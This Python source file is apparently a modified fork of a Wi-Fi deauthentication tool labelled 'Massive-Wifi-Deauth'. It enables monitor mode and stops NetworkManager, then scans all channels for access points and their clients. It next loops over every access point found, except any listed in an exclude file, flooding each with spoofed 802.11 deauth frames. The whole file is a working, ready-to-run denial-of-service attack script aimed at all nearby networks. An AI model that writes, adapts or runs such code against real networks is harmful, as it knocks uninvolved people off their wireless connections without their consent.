#!/usr/bin/env python3
import copy
import signal
import logging
import argparse
import traceback
import pkg_resources
import os

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings

from scapy.all import *
from time import sleep
from utils import *

conf.verb = 0


#   -----------------------------------------------------------------------------------------------------------------------------------------------------
#   .....................................................................................................................................................
#    _____                                __                             __      __ __  _____ __         _________                          __   __ 
#   /     \   _____      ______   ______ |__| ___  __   ____            /  \    /  \__|/ ____\__|        \    __  \   ____  _____    __ ___/  |_|  |__
#  /  \ /  \  \__  \    /  ___/  /  ___/ /  \ \  \/ / / ___ \    ______ \   \/\/   /  \   __\|  |  ______ |  |  \  \/ ___ \ \  __ \ |  |  \   __|  |  \
# /    Y    \  / __ \_  \___ \   \___ \  |  |  \   /  \  ___/   /_____/  \        /|  ||  |  |  | /_____/ |  |__/  /\  ___/ | |__\ \|  |  /|  | |   Y  \
# \____|____/ (______/ /______/ /______/ |__|   \_/    \_____/            \__/\__/ |__||__|  |__|         |_______/  \_____/_______/ ____/ |__| |___|__/
#   .....................................................................................................................................................
#   Ⓒ by https://github.com/flashnuke Ⓒ..................................................................................................................
#   -----------------------------------------------------------------------------------------------------------------------------------------------------


class Interceptor:
    _ABORT = False

    def __init__(self, net_iface, skip_monitor_mode_setup, kill_networkmanager, bssid_name, custom_channels, file_bssid_exclude, client_time_wait,n_deauth):
        self.interface = net_iface
        self.killnetworkmanager=kill_networkmanager
        self.bssid_exclude = file_bssid_exclude
        self.client_time_to_wait=client_time_wait
        self._channel_sniff_timeout = 2
        self._scan_intv = 0.1
        self._deauth_intv = 0.1
        self._printf_res_intv = 1
        self.csize=64  # screen columsize
        self._ssid_str_pad = 35  # total len 42
        self.stop_threads=False
        self._current_channel_num = None
        self._current_channel_aps = set()

        self.attack_loop_count = 0
        
        self.target_map: Dict[int, SSID] = dict()
        self.target_ssid: Union[SSID, None] = None
        self.client_time_to_wait= 30	 # default time to wait clients
        self.number_deauth= 1	 # default number of de-authentication passes per ap-scan     
         
        if n_deauth and int(n_deauth) > 0:
            self.number_deauth=int(n_deauth)
   
        if client_time_wait and int(client_time_wait) > 0:
            self.client_time_to_wait=int(client_time_wait)

        if not skip_monitor_mode_setup:
            print_info(f"Setting up monitor mode...")
            if not self._enable_monitor_mode():
                print_error(f"Monitor mode was not enabled properly")
                raise Exception("Unable to turn on monitor mode")
            print_info(f"Monitor mode was set up successfully")
        else:
            print_info(f"Skipping monitor mode setup...")

        if kill_networkmanager:
            print_info(f"Killing NetworkManager...")
            if not self._kill_networkmanager():
                print_error(f"Failed to kill NetworkManager...")

        self._channel_range = {channel: defaultdict(dict) for channel in self._get_channels()}
        self._all_ssids: Dict[BandType, Dict[str, SSID]] = {band: dict() for band in BandType}
 	
 	
        self._custom_bssid_name: Union[str, None] = self.parse_custom_bssid_name(bssid_name)
        self._custom_bssid_channels: List[int] = self.parse_custom_channels(custom_channels)
        self._custom_bssid_last_ch = 0  # to avoid overlapping
        

    @staticmethod
    def parse_custom_bssid_name(bssid_name: Union[None, str]) -> Union[None, str]:
        if bssid_name is not None:
            bssid_name = str(bssid_name)
            if len(bssid_name) == 0:
                print_error(f"Custom BSSID name cannot be an empty string")
                raise Exception("Invalid BSSID name")
        return bssid_name

    def parse_custom_channels(self, channel_list: Union[None, str]):
        ch_list = list()
        if channel_list is not None:
            try:
                ch_list = [int(ch) for ch in channel_list.split(',')]
            except Exception as exc:
                print_error(f"Invalid custom channel input -> {channel_list}")
                raise Exception("Bad custom channel input")

            if len(ch_list):
                supported_channels = self._channel_range.keys()
                for ch in ch_list:
                    if ch not in supported_channels:
                        print_error(f"Custom channel {ch} is not supported by the network interface"
                                    f" {list(supported_channels)}")
                        raise Exception("Unsupported channel")
        return ch_list

    def _enable_monitor_mode(self):
        for cmd in [f"sudo ip link set {self.interface} down",
                    f"sudo iw {self.interface} set monitor control",
                    f"sudo ip link set {self.interface} up"]:
            print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
            if os.system(cmd):
                return False
        return True

    @staticmethod
    def _kill_networkmanager():
        cmd = 'systemctl stop NetworkManager'
        print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
        return not os.system(cmd)

    def _set_channel(self, ch_num):
        os.system(f"iw dev {self.interface} set channel {ch_num}")
        self._current_channel_num = ch_num

    def _get_channels(self) -> List[int]:
        return [int(channel.split('Channel')[1].split(':')[0].strip())
                for channel in os.popen(f'iwlist {self.interface} channel').readlines()
                if 'Channel' in channel and 'Current' not in channel]

    def _ap_sniff_cb(self, pkt):
        try:
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                ap_mac = str(pkt.addr3)
                ssid = pkt[Dot11Elt].info.strip(b'\x00').decode('utf-8').strip() or ap_mac
                if ap_mac == BD_MACADDR or not ssid or (self._custom_bssid_name_is_set()
                                                        and ssid != self._custom_bssid_name):
                    return
                pkt_ch = frequency_to_channel(pkt[RadioTap].Channel)
                band_type = BandType.T_50GHZ if pkt_ch > 14 else BandType.T_24GHZ
                if ssid not in self._all_ssids[band_type]:
                    self._all_ssids[band_type][ssid] = SSID(ssid, ap_mac, band_type)
                self._all_ssids[band_type][ssid].add_channel(pkt_ch if pkt_ch in self._channel_range else self._current_channel_num)
                if self._custom_bssid_name_is_set():
                    self._custom_bssid_last_ch = self._all_ssids[band_type][ssid].channel
            else:
                self._clients_sniff_cb(pkt)  # pass forward to find potential clients
        except Exception as exc:
            pass

    def _scan_channels_for_aps(self):
        channels_to_scan = self._custom_bssid_channels or self._channel_range
        print_info(f"Starting AP scan, please wait... ({len(channels_to_scan)} channels total)")
        if self._custom_bssid_name_is_set():
            print_info(f"Scanning for target BSSID -> {self._custom_bssid_name}")

        try:
            for idx, ch_num in enumerate(channels_to_scan):
                ''' #Remove because the same bssid name can be in 2,4Ghz channel and 5Ghz channel
                if self._custom_bssid_name_is_set() and self._found_custom_bssid_name() \
                        and self._current_channel_num - self._custom_bssid_last_ch > 2:
                    # make sure sniffing doesn't stop on an overlapped channel for custom BSSIDs
                    return
                '''
                
                self._set_channel(ch_num)
                print_info(f"Scanning channel {self._current_channel_num} (left -> "
                           f"{len(channels_to_scan) - (idx + 1)})", end="\r")
                sniff(prn=self._ap_sniff_cb, iface=self.interface, timeout=self._channel_sniff_timeout,
                      stop_filter=lambda p: Interceptor._ABORT is True)
        finally:
            printf("")

    def _found_custom_bssid_name(self):
        for all_channel_aps in self._all_ssids.values():
            for ssid_name in all_channel_aps.keys():
                if ssid_name == self._custom_bssid_name:
                    return True
        return False
        
    def _custom_bssid_name_is_set(self):
        return self._custom_bssid_name is not None

    def _start_initial_ap_scan(self) -> SSID:
        self._scan_channels_for_aps()
        for band_ssids in self._all_ssids.values():
            for ssid_name, ssid_obj in band_ssids.items():
                self._channel_range[ssid_obj.channel][ssid_name] = copy.deepcopy(ssid_obj)

        pref = '[   ] '
        printf(f"{DELIM}\n"
               f"{pref}{self._generate_ssid_str('SSID Name', 'Channel', 'MAC Address', len(pref))}")

        ctr = 0
        self.target_map: Dict[int, SSID] = dict()
        for channel, all_channel_aps in sorted(self._channel_range.items()):
            for ssid_name, ssid_obj in all_channel_aps.items():
                ctr += 1
                self.target_map[ctr] = copy.deepcopy(ssid_obj)
                pref = f"[{str(ctr).rjust(3, ' ')}] "
                preflen = len(pref)
                pref = f"[{BOLD}{YELLOW}{str(ctr).rjust(3, ' ')}{RESET}] "
                printf(f"{pref}{self._generate_ssid_str(ssid_obj.name, ssid_obj.channel, ssid_obj.mac_addr, preflen)}")
                
        printf(DELIM)
        if not self.target_map:
            print_error("Not APs were found ...")
        else:
            print (self.target_map)
            
        return

    def _generate_ssid_str(self, ssid, ch, mcaddr, preflen):
        return f"{ssid.ljust(self._ssid_str_pad - preflen, ' ')}{str(ch).ljust(3, ' ').ljust(self._ssid_str_pad // 2, ' ')}{mcaddr}"

    def _clients_sniff_cb(self, pkt):
        try:
            if self._packet_confirms_client(pkt):
                ap_mac = str(pkt.addr3)
                if ap_mac == self.target_ssid.mac_addr:
                    c_mac = pkt.addr1
                    if c_mac != BD_MACADDR and c_mac not in self.target_ssid.clients:
                        self.target_ssid.clients.append(c_mac)
        except:
            pass

    @staticmethod
    def _packet_confirms_client(pkt):
        return (pkt.haslayer(Dot11AssoResp) and pkt[Dot11AssoResp].status == 0) or \
               (pkt.haslayer(Dot11ReassoResp) and pkt[Dot11ReassoResp].status == 0) or \
               pkt.haslayer(Dot11QoS)

    def _listen_for_clients(self):
        print_info(f"Setting up a listener for new clients...")
        sniff(prn=self._clients_sniff_cb, iface=self.interface, stop_filter=lambda p: Interceptor._ABORT is True)

    def _read_bssid_to_exclude(self):
        try:
            if  self.bssid_exclude is not None :    
                if os.path.isfile(self.bssid_exclude) :
                      print_info(f"Reading file to exclude bssid {self.bssid_exclude} ...")
                      exclude_file = open(self.bssid_exclude, "r") 
  
                      # reading the file 
                      data = exclude_file.read() 
  
                      # replacing end splitting the text  
                      # when newline ('\n') is seen. 
                      data_into_list = data.split("\n")  
                      exclude_file.close() 
                      return data_into_list
            return []
        except Exception as exc:
            print_error(f"Error Reading the file exclude bssid -> {traceback.format_exc()}")
            

        
    def _run_deauther(self):
        try:
            print_info(f"Starting de-auth loop...")

            ap_mac = self.target_ssid.mac_addr

            rd_frm = RadioTap()
            deauth_frm = Dot11Deauth(reason=7)
            while not self.stop_threads and not Interceptor._ABORT :
                self.attack_loop_count += 1
                sendp(rd_frm /
                      Dot11(addr1=BD_MACADDR, addr2=ap_mac, addr3=ap_mac) /
                      deauth_frm,
                      iface=self.interface)
                for client_mac in self.target_ssid.clients:
                    sendp(rd_frm /
                          Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
                          deauth_frm,
                          iface=self.interface)
                    sendp(rd_frm /
                          Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) /
                          deauth_frm,
                          iface=self.interface)
            sleep(self._deauth_intv)
            print_info(f"Stoping de-auth loop...")
            
        except Exception as exc:
            print_error(f"Exception in deauth-loop -> {traceback.format_exc()}")
          
            if self.killnetworkmanager:
                print_info(f"Killing NetworkManager...")
                if not self._kill_networkmanager():
                    print_error(f"Failed to kill NetworkManager...")
                            
            if not self._enable_monitor_mode():
                print_error(f"Monitor mode was not enabled properly")
                raise Exception("Unable to turn on monitor mode")
            print_info(f"Monitor mode was set up successfully")
            sleep(self._printf_res_intv)

            return

    def run(self):
        list_exclude=self._read_bssid_to_exclude()
        self._start_initial_ap_scan()
            
        while True and not Interceptor._ABORT:       
            try:
                if self.target_map:  
     
                    if max(self.target_map.keys()) > 0:
                        break
                        
                print_info("No SSID Founds , try again")
            except ValueError:
                print_info("Index must be a number, try again")
                
        count=self.number_deauth
        while count > 0 and not Interceptor._ABORT:  
	        count -= 1
	        for i in range(min(self.target_map.keys()),max(self.target_map.keys())+1,1): 
	            
	            if self.target_map[i].name in list_exclude: 
	                print_info(f"Exluding BSSID : {BOLD}{self.target_map[i].name}{RESET}") 
	                printf(f"{DELIM}")
	
	            else:
	                self.target_ssid = self.target_map[i] 
	                ssid_ch = self.target_ssid.channel  
	                
	                print_info(f"Attacking target {self.target_ssid.name}")
	                print_info(f"Setting channel -> {ssid_ch}")
	                print_info(f"MAC addr[{self.target_ssid.mac_addr}]")
	                self._set_channel(ssid_ch)
	
	
	                self.stop_threads=False
	                for action in [self._run_deauther, self._listen_for_clients]:
	                    t = Thread(target=action, args=tuple(), daemon=True)
	                    t.start() 
	
	                start = get_time()
	                elapse = 0
	                printf(f"{DELIM}\n")                
	                while elapse <= self.client_time_to_wait and not Interceptor._ABORT :
	                    elapse = int (get_time() - start)
	                    print_info(f"Net interface{self.interface.rjust(self.csize - 17, ' ')}")
	                    print_info(f"Confirmed clients{BOLD}{str(len(self.target_ssid.clients)).rjust(self.csize - 21, ' ')}{RESET}")
	                    print_info(f"Elapsed sec {BOLD}{str(elapse).rjust(self.csize - 16, ' ')}{RESET}", end="\r")
	                    sleep(self._printf_res_intv)
 
	                    clear_line(3) 
	                    print_info(f"            {str('        ').rjust(self.csize - 12, ' ')}") 
	                    print_info(f"            {str('        ').rjust(self.csize - 12, ' ')}")
	                    print_info(f"            {str('        ').rjust(self.csize - 12, ' ')}", end="\r")        
	                    clear_line(3)               

	                 
	
	                clear_line(2)
	                print_info(f"\33[1A", end="\r")                
	                print_info(f"Confirmed clients{BOLD}{str(len(self.target_ssid.clients)).rjust(self.csize - 21, ' ')}{RESET}")

	                self.stop_threads=True            
	                t.join(timeout=1.0)
	                printf(f"{DELIM}")

                
    @staticmethod
    def user_abort(*args):
        if not Interceptor._ABORT:
            Interceptor._ABORT = True
            printf(f"{DELIM}")
            print_error(f"User asked to stop, quitting...")
            exit(0)


if __name__ == "__main__":
    signal.signal(signal.SIGINT, Interceptor.user_abort)

    printf(f"\n{BANNER}\n"
           f"Make sure of the following:\n"
           f"1. You are running as {BOLD}root{RESET}\n"
           f"2. You kill NetworkManager (manually or by passing {BOLD}--kill{RESET})\n"
           f"3. Your wireless adapter supports {BOLD}monitor mode{RESET} (refer to docs)\n\n"
           f"Written by {BOLD}@flashnuke{RESET}\n"
           f"Mod by {BOLD}amerinoj{RESET}")
    printf(DELIM)
    restore_print()

    if os.getuid() != 0:
        printf(f"{BOLD}Exit , Please run as root{RESET}")
        exit(1)
	
    if "linux" not in platform:
        raise Exception(f"Unsupported operating system {platform}, only linux is supported...")
    with open("requirements.txt", "r") as reqs:
        pkg_resources.require(reqs.readlines())

    parser = argparse.ArgumentParser(description='A simple program to perform a deauth attack')
    parser.add_argument('-i', '--iface', help='a network interface with monitor mode enabled (i.e -> "eth0")',
                        action='store', dest="net_iface", metavar="network_interface", required=True)
    parser.add_argument('-sm', '--skip-monitormode', help='skip automatic setup of monitor mode', action='store_true',
                        default=False, dest="skip_monitormode", required=False)
    parser.add_argument('-k', '--kill', help='kill NetworkManager (might interfere with the process)',
                        action='store_true', default=False, dest="kill_networkmanager", required=False)
    parser.add_argument('-b', '--bssid', help='custom BSSID name (case-sensitive)', metavar="bssid_name",
                        action='store', default=None, dest="custom_bssid", required=False)
    parser.add_argument('-c', '--channels', help='custom channels to scan, separated by a comma (i.e -> 1,3,4)',
                        metavar="ch1,ch2", action='store', default=None, dest="custom_channels", required=False)
    parser.add_argument('-e', '--exclude', help='a file path that contain ESSID to exclude the attack',
                        action='store', dest="file_bssid_exclude", required=False)
    parser.add_argument('-t', '--time', help='time to find clients, default 30',
                        action='store', dest="client_time_wait", required=False)
    parser.add_argument('-n', '--number', help='number of de-authentications per ap-scan',
                        action='store', dest="n_deauth", required=False)                          
    pargs = parser.parse_args()

    invalidate_print()  # after arg parsing
    attacker = Interceptor(net_iface=pargs.net_iface,
                           skip_monitor_mode_setup=pargs.skip_monitormode,
                           kill_networkmanager=pargs.kill_networkmanager,
                           bssid_name=pargs.custom_bssid,
                           custom_channels=pargs.custom_channels,
                           file_bssid_exclude=pargs.file_bssid_exclude,
                           client_time_wait=pargs.client_time_wait,
                           n_deauth=pargs.n_deauth)

    while  not Interceptor._ABORT :
        try:                 
            attacker.run()
        except Exception as exc:
            print_error(f"Exception in attacker-run -> {traceback.format_exc()}")
    
    
